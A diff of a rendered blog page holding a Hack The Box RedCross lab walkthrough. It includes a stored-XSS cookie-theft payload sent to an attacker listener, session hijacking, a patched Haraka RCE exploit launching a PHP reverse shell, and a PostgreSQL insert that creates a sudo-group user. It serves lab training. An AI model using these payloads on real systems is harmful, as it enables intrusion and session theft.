@@ -1,29 +1,30 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-14:I[484,[],"OutletBoundary"]
-15:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: RedCross Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Stored XSS stole an administrator session, which opened hidden services and a jailed account; Haraka attachment RCE then landed as Penelope, and writable PostgreSQL-backed NSS records created a sudo-group user for root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:49:40.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[11," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-redcross-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box RedCross machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official RedCross machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/redcross","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9","$La"]]}],"$Lb"]}]]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$L10",null,{"headings":[{"id":"1-reconnaissance","label":"1. Reconnaissance"},{"id":"2-web-enumeration","label":"2. Web Enumeration"},{"id":"3-xss-via-contact-form","label":"3. XSS via Contact Form"},{"id":"4-admin-panel-access","label":"4. Admin Panel Access"},{"id":"5-firewall-whitelist-opening-new-ports","label":"5. Firewall Whitelist: Opening New Ports"},{"id":"6-ssh-jail-virtual-user-creation","label":"6. SSH Jail: Virtual User Creation"},{"id":"7-haraka-smtp-rce-shell-as-penelope","label":"7. Haraka SMTP RCE: Shell as Penelope"},{"id":"8-user-flag","label":"8. User Flag"},{"id":"9-privilege-escalation-via-postgresql","label":"9. Privilege Escalation via PostgreSQL"},{"id":"10-root-flag","label":"10. Root Flag"},{"id":"11-key-lessons","label":"11. Key lessons"},{"id":"attack-chain-summary","label":"Attack Chain Summary"},{"id":"credentials-reference","label":"Credentials Reference"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/00a1686ad8de3dd442462fe01ba75e15f2964db2/HTB-RedCross.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 00a1686ad8de",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["RedCross, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/redcross","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"5 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-a:["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}]
-11:T57ce,<p><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux (Debian)<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.11.228  </p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: RedCross Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Stored XSS stole an administrator session, which opened hidden services and a jailed account; Haraka attachment RCE then landed as Penelope, and writable PostgreSQL-backed NSS records created a sudo-group user for root."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"RedCross"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/redcross","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Hard"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-redcross-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box RedCross machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official RedCross machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/redcross","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T5e14,<p><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux (Debian)<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.11.228  </p>
 <hr>
 
 
 
 <h2 id="1-reconnaissance">1. Reconnaissance</h2>
 <h3 id="command">Command</h3>
-<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 5000 -oA nmap_full 10.129.11.228
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 5000 -oA nmap_full 10.129.11.228
 </code></pre>
 <h3 id="results">Results</h3>
-<pre><code>PORT    STATE SERVICE  VERSION
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.9p1 Debian
 80/tcp  open  http     Apache httpd 2.4.38
 443/tcp open  ssl/http Apache httpd 2.4.38
@@ -46,7 +47,7 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 <hr>
 <h2 id="2-web-enumeration">2. Web Enumeration</h2>
 <h3 id="add-hosts-entry">Add hosts entry</h3>
-<pre><code class="language-bash" data-language="bash">echo "10.129.11.228 redcross.htb intra.redcross.htb admin.redcross.htb" | sudo tee -a /etc/hosts
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">echo "10.129.11.228 redcross.htb intra.redcross.htb admin.redcross.htb" | sudo tee -a /etc/hosts
 </code></pre>
 
 <p>Apache uses the <code>Host:</code> header to route requests to virtual hosts. Without adding the hostname to <code>/etc/hosts</code>, we can't reach the site at all - we'd get a redirect loop or wrong content. add every discovered hostname.</p>
@@ -59,12 +60,12 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 </ul>
 <p>The <code>?page=</code> URL parameter is a strong clue - it means PHP is <strong>including files by name</strong>. This pattern is often vulnerable to <strong>Local File Inclusion (LFI)</strong> and tells us the site structure.</p>
 <h3 id="discover-admin-redcross-htb">Discover admin.redcross.htb</h3>
-<pre><code class="language-bash" data-language="bash"># manual check since gobuster wordlists missed it
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash"># manual check since gobuster wordlists missed it
 curl -sk https://admin.redcross.htb/
 </code></pre>
 <p>We find an "IT Admin panel" login at <code>admin.redcross.htb</code>. We need credentials to access it.</p>
 <h3 id="enumerate-the-contact-form">Enumerate the contact form</h3>
-<pre><code class="language-bash" data-language="bash">curl -sk "https://intra.redcross.htb/?page=contact"
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">curl -sk "https://intra.redcross.htb/?page=contact"
 </code></pre>
 <p>The form has three fields:</p>
 <ul>
@@ -82,7 +83,7 @@ curl -sk https://admin.redcross.htb/
 <p>The web application runs an automated admin bot that reads contact form submissions and renders them in a browser. If we inject JavaScript into a field that isn't sanitized, the admin's browser will execute it and we can steal their session cookie.</p>
 <p><strong>The catch:</strong> The <code>subject</code> and <code>body</code> fields filter <code>&lt;</code> characters. But <code>cback</code> (callback contact) does not.</p>
 <h3 id="testing-the-filter">Testing the filter</h3>
-<pre><code class="language-bash" data-language="bash"># This gets blocked (Oops! message):
+<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash"># This gets blocked (Oops! message):
 curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
   -d "subject=Test&amp;body=Hello+%3C&amp;cback=test@test.com&amp;action=contact"
 
@@ -92,12 +93,12 @@ curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
 </code></pre>
 <p>Finding this required <strong>testing each field in isolation</strong> - a critical technique when WAFs or filters are involved.</p>
 <h3 id="set-up-the-listener">Set up the listener</h3>
-<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/xss &amp;&amp; cd /tmp/xss
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">mkdir -p /tmp/xss &amp;&amp; cd /tmp/xss
 python3 -m http.server 8888
 </code></pre>
 <p>We need a server to receive the stolen cookie. The admin's browser will make an HTTP request to us carrying their session data.</p>
 <h3 id="fire-the-xss">Fire the XSS</h3>
-<pre><code class="language-bash" data-language="bash">curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
   --data-urlencode "subject=Test" \
   --data-urlencode "body=Hello" \
   --data-urlencode "cback=&lt;script&gt;new Image().src='http://10.10.16.84:8888/?c='+document.cookie&lt;/script&gt;" \
@@ -105,7 +106,7 @@ python3 -m http.server 8888
 </code></pre>
 <p><strong>Why <code>new Image().src</code> instead of <code>document.location</code>?</strong><br><code>document.location</code> redirects the page - the admin's current tab navigates away, which might look suspicious or break the admin's workflow. <code>new Image().src</code> is a silent, background request that doesn't change the page - stealthier and more reliable.</p>
 <h3 id="result-after-60-seconds">Result (after ~60 seconds)</h3>
-<pre><code>10.129.11.228 - "GET /?c=PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
+<pre tabindex="0" aria-label="Code or terminal block 9"><code>10.129.11.228 - "GET /?c=PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
 </code></pre>
 <p>We captured the admin's full cookie jar.</p>
 
@@ -115,7 +116,7 @@ python3 -m http.server 8888
 <hr>
 <h2 id="4-admin-panel-access">4. Admin Panel Access</h2>
 <h3 id="use-the-stolen-cookie">Use the stolen cookie</h3>
-<pre><code class="language-bash" data-language="bash">curl -sk "https://intra.redcross.htb/?page=admin" \
+<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">curl -sk "https://intra.redcross.htb/?page=admin" \
   -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
 
 curl -sk "https://admin.redcross.htb/" \
@@ -135,18 +136,18 @@ curl -sk "https://admin.redcross.htb/" \
 <hr>
 <h2 id="5-firewall-whitelist-opening-new-ports">5. Firewall Whitelist: Opening New Ports</h2>
 <h3 id="command-2">Command</h3>
-<pre><code class="language-bash" data-language="bash">curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
   -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin" \
   -d "ip=10.10.16.84&amp;action=Allow+IP"
 </code></pre>
 
-<pre><code>Network access granted to 10.10.16.84
+<pre tabindex="0" aria-label="Code or terminal block 12"><code>Network access granted to 10.10.16.84
 </code></pre>
 <h3 id="re-scan-after-whitelisting">Re-scan after whitelisting</h3>
-<pre><code class="language-bash" data-language="bash">nmap -sV --min-rate 3000 -p- 10.129.11.228
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">nmap -sV --min-rate 3000 -p- 10.129.11.228
 </code></pre>
 <p>New ports now visible:</p>
-<pre><code>21/tcp   open  ftp         vsftpd
+<pre tabindex="0" aria-label="Code or terminal block 14"><code>21/tcp   open  ftp         vsftpd
 1025/tcp open  ???
 5432/tcp open  postgresql  PostgreSQL DB 9.6
 </code></pre>
@@ -163,15 +164,15 @@ curl -sk "https://admin.redcross.htb/" \
 <hr>
 <h2 id="6-ssh-jail-virtual-user-creation">6. SSH Jail: Virtual User Creation</h2>
 <h3 id="create-a-virtual-user">Create a virtual user</h3>
-<pre><code class="language-bash" data-language="bash">curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
   -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; ..." \
   -d "username=hacker01&amp;action=adduser"
 </code></pre>
 <p>Response:</p>
-<pre><code>Provide this credentials to the user: hacker01 : q7s76PIg
+<pre tabindex="0" aria-label="Code or terminal block 16"><code>Provide this credentials to the user: hacker01 : q7s76PIg
 </code></pre>
 <h3 id="ssh-in">SSH in</h3>
-<pre><code class="language-bash" data-language="bash">ssh hacker01@10.129.11.228
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">ssh hacker01@10.129.11.228
 # password: REDACTED
 $ id
 uid=2020 gid=1001(associates) groups=1001(associates)
@@ -179,7 +180,7 @@ uid=2020 gid=1001(associates) groups=1001(associates)
 <h3 id="the-chroot-jail">The chroot jail</h3>
 <p>We land in a minimal environment. <code>ls /</code> shows only: <code>bin dev etc home lib lib64 root usr</code>.</p>
 <p>This is <strong>not the real filesystem</strong> - it's a chroot jail. The <code>sshd_config</code> contains:</p>
-<pre><code>Match group associates
+<pre tabindex="0" aria-label="Code or terminal block 18"><code>Match group associates
     ChrootDirectory /var/jail/
 </code></pre>
 <p>Anyone in the <code>associates</code> group (GID 1001) gets chrooted to <code>/var/jail/</code>. The jail's <code>/home</code> contains:</p>
@@ -205,20 +206,20 @@ uid=2020 gid=1001(associates) groups=1001(associates)
 <hr>
 <h2 id="7-haraka-smtp-rce-shell-as-penelope">7. Haraka SMTP RCE: Shell as Penelope</h2>
 <h3 id="identify-port-1025">Identify port 1025</h3>
-<pre><code class="language-bash" data-language="bash">nc -nv 10.129.11.228 1025
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">nc -nv 10.129.11.228 1025
 # After waiting: "220 redcross ESMTP Haraka 2.8.8 ready"
 </code></pre>
 <p>Port 1025 is <strong>Haraka</strong>, a Node.js SMTP server. Version 2.8.8 is vulnerable to Remote Code Execution.</p>
 <h3 id="why-haraka-is-vulnerable">Why Haraka is vulnerable</h3>
 <p>Haraka's attachment plugin extracts ZIP attachments and processes them. The exploit sends a crafted ZIP containing a file named with shell metacharacters. When Haraka processes the attachment, it executes arbitrary commands - in the context of the user running Haraka (penelope, who owns the process).</p>
 <h3 id="get-and-patch-the-exploit">Get and patch the exploit</h3>
-<pre><code class="language-bash" data-language="bash">searchsploit -m linux/remote/41162.py
+<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">searchsploit -m linux/remote/41162.py
 # Fix port: change line 123 from port 25 to 1025
 sed -i 's/smtplib.SMTP(mailserver,25)/smtplib.SMTP(mailserver,1025)/' 41162.py
 </code></pre>
 <p>The exploit hardcodes port 25 (standard SMTP). Haraka runs on 1025 here, so we patch it.</p>
 <h3 id="set-up-listener-and-fire">Set up listener and fire</h3>
-<pre><code class="language-bash" data-language="bash">nc -lvnp 4444 &amp;
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">nc -lvnp 4444 &amp;
 
 python2 41162.py \
   -c "php -r '\$sock=fsockopen(\"10.10.16.84\",4444);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'" \
@@ -226,7 +227,7 @@ python2 41162.py \
   -m 10.129.11.228
 </code></pre>
 <p>After ~60 seconds:</p>
-<pre><code class="language-bash" data-language="bash">$ id
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">$ id
 uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)
 </code></pre>
 <h3 id="why-target-penelope-redcross-htb">Why target <a href="mailto:penelope@redcross.htb">Penelope@redcross.htb</a>?</h3>
@@ -243,24 +244,24 @@ uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)
 </blockquote>
 <hr>
 <h2 id="8-user-flag">8. User Flag</h2>
-<pre><code class="language-bash" data-language="bash">cat /home/penelope/user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">cat /home/penelope/user.txt
 # 413430[redacted]c043f366d
 </code></pre>
 <hr>
 <h2 id="9-privilege-escalation-via-postgresql">9. Privilege Escalation via PostgreSQL</h2>
 <h3 id="find-the-database-credentials">Find the database credentials</h3>
 <p>The PHP source code at <code>/var/www/html/admin/pages/actions.php</code> contains hardcoded credentials:</p>
-<pre><code class="language-php" data-language="php">$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=REDACTED&amp;");
+<pre tabindex="0" aria-label="php code or terminal block 24"><code class="language-php" data-language="php">$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=REDACTED&amp;");
 </code></pre>
 <p>These were found in the writeup (and accessible as <code>www-data</code> or <code>penelope</code> on the real system).</p>
 <h3 id="understanding-the-jail-architecture-nss-postgresql">Understanding the jail architecture: NSS + PostgreSQL</h3>
 <p>The SSH chroot system doesn't use <code>/etc/passwd</code> and <code>/etc/shadow</code> for virtual users. Instead it uses <strong>Name Service Switch (NSS)</strong> backed by PostgreSQL. The <code>passwd_table</code> in the <code>unix</code> database is the actual source of truth for user accounts, home directories, group IDs, and password hashes.</p>
 <p>This means: <strong>if we can modify that table, we control user attributes</strong>.</p>
 <h3 id="connect-to-postgresql">Connect to PostgreSQL</h3>
-<pre><code class="language-bash" data-language="bash">psql -h 127.0.0.1 -U unixusrmgr -d unix
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">psql -h 127.0.0.1 -U unixusrmgr -d unix
 # password: REDACTED
 </code></pre>
-<pre><code class="language-sql" data-language="sql">-- View current users
+<pre tabindex="0" aria-label="sql code or terminal block 26"><code class="language-sql" data-language="sql">-- View current users
 SELECT * FROM passwd_table;
 
 -- View available tables
@@ -268,7 +269,7 @@ SELECT * FROM passwd_table;
 -- passwd_table, shadow_table, group_table, usergroups
 </code></pre>
 <h3 id="insert-a-user-with-sudo-group-gid-27">Insert a user with sudo group (GID 27)</h3>
-<pre><code class="language-sql" data-language="sql">insert into passwd_table (username, passwd, gid, homedir) 
+<pre tabindex="0" aria-label="sql code or terminal block 27"><code class="language-sql" data-language="sql">insert into passwd_table (username, passwd, gid, homedir) 
 values ('r00t', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/');
 </code></pre>
 <ul>
@@ -289,7 +290,7 @@ values ('r00t', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/');
 </blockquote>
 <hr>
 <h2 id="10-root-flag">10. Root Flag</h2>
-<pre><code class="language-bash" data-language="bash"># From Kali
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash"># From Kali
